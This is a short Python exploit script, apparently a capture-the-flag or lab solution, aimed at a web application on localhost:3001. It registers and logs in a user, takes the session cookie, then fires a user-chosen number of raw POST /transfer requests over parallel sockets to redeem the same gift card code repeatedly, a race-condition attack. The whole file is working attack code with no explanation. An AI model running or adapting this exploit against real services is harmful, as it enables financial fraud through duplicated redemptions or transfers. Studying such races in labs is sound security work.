from pwn import *
import sys
import time
from webXtools import race
import threading
import requests

url="http://localhost:3001"
username='sOmeuser12'


req=requests.Session()

r=req.post(url+'/register',data={"name":username,"password":username})
req.post(url+'/login',data={"name":username,"password":username})
COOKIE=r.headers.get('Set-cookie')

#payload=b"""GET / HTTP/1.1\r\nHost: localhost:3001\r\n\r\n"""
payload2=f"""POST /transfer HTTP/1.1\r
Host: localhost:3001\r
User-Agent: curl/7.68.0\r
Accept: */*\r
Content-Length: 23\r
Content-Type: application/x-www-form-urlencoded\r
Cookie: {COOKIE}\r
\r
code=Gift_card_42f5ea20"""
for i in  range(int(sys.argv[1])):
    con=remote('localhost',3001)
    con.send(payload2)

